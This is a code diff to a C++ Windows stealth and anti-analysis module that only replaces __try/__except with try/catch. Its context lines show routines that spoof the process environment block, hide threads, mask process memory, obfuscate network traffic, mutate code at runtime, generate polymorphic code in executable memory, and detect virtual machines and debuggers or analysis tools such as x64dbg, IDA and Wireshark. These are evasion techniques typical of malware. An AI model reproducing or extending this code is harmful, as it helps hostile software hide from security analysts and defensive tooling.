@@ -17,19 +17,19 @@ std::vector<void*> CodeObfuscation::m_mutatedRegions;
 bool ProcessStealth::Initialize() {
     if (m_active) return true;
     
-    __try {
+    try {
         SpoofPEB();
         HideThreads();
         m_active = true;
         return true;
     }
-    __except(EXCEPTION_EXECUTE_HANDLER) {
+    catch (...) {
         return false;
     }
 }
 
 bool ProcessStealth::SpoofPEB() {
-    __try {
+    try {
 #ifdef _WIN64
         PPEB peb = (PPEB)__readgsqword(0x60);
 #else
@@ -64,13 +64,13 @@ bool ProcessStealth::SpoofPEB() {
         
         return true;
     }
-    __except(EXCEPTION_EXECUTE_HANDLER) {
+    catch (...) {
         return false;
     }
 }
 
 bool ProcessStealth::HideThreads() {
-    __try {
+    try {
         HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
         if (snapshot == INVALID_HANDLE_VALUE) return false;
         
@@ -92,13 +92,13 @@ bool ProcessStealth::HideThreads() {
         CloseHandle(snapshot);
         return true;
     }
-    __except(EXCEPTION_EXECUTE_HANDLER) {
+    catch (...) {
         return false;
     }
 }
 
 bool ProcessStealth::MaskProcessMemory() {
-    __try {
+    try {
         MEMORY_BASIC_INFORMATION mbi = {};
         void* address = NULL;
         
@@ -115,23 +115,23 @@ bool ProcessStealth::MaskProcessMemory() {
         
         return true;
     }
-    __except(EXCEPTION_EXECUTE_HANDLER) {
+    catch (...) {
         return false;
     }
 }
 
 bool NetworkStealth::Initialize() {
-    __try {
+    try {
         m_obfuscationKey = GetTickCount() ^ 0xDEADBEEF;
         return true;
     }
-    __except(EXCEPTION_EXECUTE_HANDLER) {
+    catch (...) {
         return false;
     }
 }
 
 void NetworkStealth::ObfuscateTraffic(std::vector<BYTE>& data) {
-    __try {
+    try {
         if (data.empty()) return;
         
         for (size_t i = 0; i < data.size(); i++) {
@@ -139,12 +139,12 @@ void NetworkStealth::ObfuscateTraffic(std::vector<BYTE>& data) {
             data[i] = (data[i] << 3) | (data[i] >> 5);
         }
     }
-    __except(EXCEPTION_EXECUTE_HANDLER) {
+    catch (...) {
     }
 }
 
 void NetworkStealth::DeobfuscateTraffic(std::vector<BYTE>& data) {
-    __try {
+    try {
         if (data.empty()) return;
         
         for (size_t i = 0; i < data.size(); i++) {
@@ -152,12 +152,12 @@ void NetworkStealth::DeobfuscateTraffic(std::vector<BYTE>& data) {
             data[i] ^= (BYTE)(m_obfuscationKey >> (i % 4 * 8));
         }
     }
-    __except(EXCEPTION_EXECUTE_HANDLER) {
+    catch (...) {
     }
 }
 
 bool NetworkStealth::DetectNetworkMonitoring() {
-    __try {
+    try {
         HMODULE ws2_32 = GetModuleHandleA("ws2_32.dll");
         if (!ws2_32) return false;
         
@@ -174,13 +174,13 @@ bool NetworkStealth::DetectNetworkMonitoring() {
         
         return false;
     }
-    __except(EXCEPTION_EXECUTE_HANDLER) {
+    catch (...) {
         return false;
     }
 }
 
 void NetworkStealth::GenerateRealisticTraffic() {
-    __try {
+    try {
         WSADATA wsaData = {};
         if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) return;
         
@@ -201,7 +201,7 @@ void NetworkStealth::GenerateRealisticTraffic() {
         
         WSACleanup();
     }
-    __except(EXCEPTION_EXECUTE_HANDLER) {
+    catch (...) {
     }
 }
 
@@ -210,7 +210,7 @@ bool CodeObfuscation::Initialize() {
 }
 
 void CodeObfuscation::MutateCodeAtRuntime(void* codePtr, size_t size) {
-    __try {
+    try {
         if (!codePtr || size == 0 || IsBadWritePtr(codePtr, size)) return;
         
         DWORD oldProtect;
@@ -232,12 +232,12 @@ void CodeObfuscation::MutateCodeAtRuntime(void* codePtr, size_t size) {
         VirtualProtect(codePtr, size, oldProtect, &oldProtect);
         m_mutatedRegions.push_back(codePtr);
     }
-    __except(EXCEPTION_EXECUTE_HANDLER) {
+    catch (...) {
     }
 }
 
 void* CodeObfuscation::CreatePolymorphicCode(void* originalCode, size_t size) {
-    __try {
+    try {
         if (!originalCode || size == 0 || IsBadReadPtr(originalCode, size)) return nullptr;
         
         void* polymorphicCode = VirtualAlloc(NULL, size * 2, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
@@ -253,18 +253,18 @@ void* CodeObfuscation::CreatePolymorphicCode(void* originalCode, size_t size) {
         
         return polymorphicCode;
     }
-    __except(EXCEPTION_EXECUTE_HANDLER) {
+    catch (...) {
         return nullptr;
     }
 }
 
 void CodeObfuscation::DestroyPolymorphicCode(void* polymorphicCode) {
-    __try {
+    try {
         if (polymorphicCode) {
             VirtualFree(polymorphicCode, 0, MEM_RELEASE);
         }
     }
-    __except(EXCEPTION_EXECUTE_HANDLER) {
+    catch (...) {
     }
 }
 
@@ -273,20 +273,20 @@ bool EnvironmentDetection::Initialize() {
 }
 
 bool EnvironmentDetection::DetectVirtualMachine() {
-    __try {
+    try {
         if (CheckCPUID()) return true;
         if (CheckRegistryKeys()) return true;
         if (CheckRunningProcesses()) return true;
         
         return false;
     }
-    __except(EXCEPTION_EXECUTE_HANDLER) {
+    catch (...) {
         return true;
     }
 }
 
 bool EnvironmentDetection::CheckCPUID() {
-    __try {
+    try {
         int cpuInfo[4] = {};
         __cpuid(cpuInfo, 0);
         
@@ -301,13 +301,13 @@ bool EnvironmentDetection::CheckCPUID() {
         
         return false;
     }
-    __except(EXCEPTION_EXECUTE_HANDLER) {
+    catch (...) {
         return true;
     }
 }
 
 bool EnvironmentDetection::CheckRegistryKeys() {
-    __try {
+    try {
         HKEY hKey;
         const char* vmKeys[] = {
             "SYSTEM\\CurrentControlSet\\Enum\\SCSI\\Disk&Ven_VMware_",
@@ -324,13 +324,13 @@ bool EnvironmentDetection::CheckRegistryKeys() {
         
         return false;
     }
-    __except(EXCEPTION_EXECUTE_HANDLER) {
+    catch (...) {
         return true;
     }
 }
 
 bool EnvironmentDetection::CheckRunningProcesses() {
-    __try {
+    try {
         HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
         if (snapshot == INVALID_HANDLE_VALUE) return false;
         
@@ -355,13 +355,13 @@ bool EnvironmentDetection::CheckRunningProcesses() {
         CloseHandle(snapshot);
         return false;
     }
-    __except(EXCEPTION_EXECUTE_HANDLER) {
+    catch (...) {
         return true;
     }
 }
 
 bool EnvironmentDetection::DetectAnalysisTools() {
-    __try {
+    try {
         const char* analysisTools[] = {
             "ollydbg.exe", "x64dbg.exe", "ida.exe", "ida64.exe", 
             "wireshark.exe", "procmon.exe", "processhacker.exe"
@@ -387,7 +387,7 @@ bool EnvironmentDetection::DetectAnalysisTools() {
         CloseHandle(snapshot);
         return false;
     }
-    __except(EXCEPTION_EXECUTE_HANDLER) {
+    catch (...) {
         return true;
     }
 }
